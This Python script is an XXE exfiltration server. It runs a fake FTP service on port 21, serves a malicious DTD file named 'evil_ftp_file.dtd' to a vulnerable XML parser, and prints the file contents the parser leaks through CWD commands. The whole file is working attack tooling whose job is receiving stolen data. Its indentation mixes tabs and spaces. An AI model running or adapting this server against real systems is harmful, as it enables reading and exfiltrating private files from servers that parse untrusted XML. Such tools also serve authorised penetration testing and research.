#!/usr/env/python
#Based on https://gist.github.com/staaldraad/280f167f5cb49a80b4a3

from __future__ import print_function
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('0.0.0.0',21))
s.listen(1)
print('XXE-FTP listening ')
conn,addr = s.accept()
print('Connected by %s',addr)
conn.sendall('220 Staal XXE-FTP\r\n')
stop = False
count=0
dataSockAddr=""
dataSockPort=0

# This will open a data channel to send a file to the client.
def sendData(data):
    try:
       #print(data)
       #print(dataSockAddr)
       #print(dataSockPort)
       dataSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       dataSock.connect((dataSockAddr, dataSockPort))
       dataSock.send(data.encode('utf-8'))
       dataSock.close()
    except socket.error as err:
       print('DataSock', err)
    

while not stop:
    dp = str(conn.recv(1024))
    if dp.find("USER") > -1:
        conn.sendall("331 password please - version check\r\n")
    else:
        conn.sendall("230 more data please!\r\n")
    if dp.find("RETR")==0 and count==6:
        print("Requesting file")
	file1 = open("evil_ftp_file.dtd","r")
        conn.sendall("150 File status okay; about to open data connection\r\n")
	data = file1.read()
	print("Sending data")
	sendData(data)
	file1.close()
        conn.sendall("226 Transfer complete.\r\n")
	print("Transfer Complete")
    elif dp.find("RETR")==0 or dp.find("QUIT")==0 and count>=7:
        stop = True
	print(count)
    if dp.find("EPRT")==0:
        print("Obtaining IP and port")
	res=dp.split("|")
	dataSockAddr=res[2]
	dataSockPort=int(res[3])
    if dp.find("LIST")==0:
        conn.sendall("230 more data please!\r\n")
    if dp.find("CWD") > -1:
        print(dp.replace('CWD ','/',1).replace('\r\n',''),end='')
    else:
        print(dp)
    count=count+1
conn.close()
s.close()

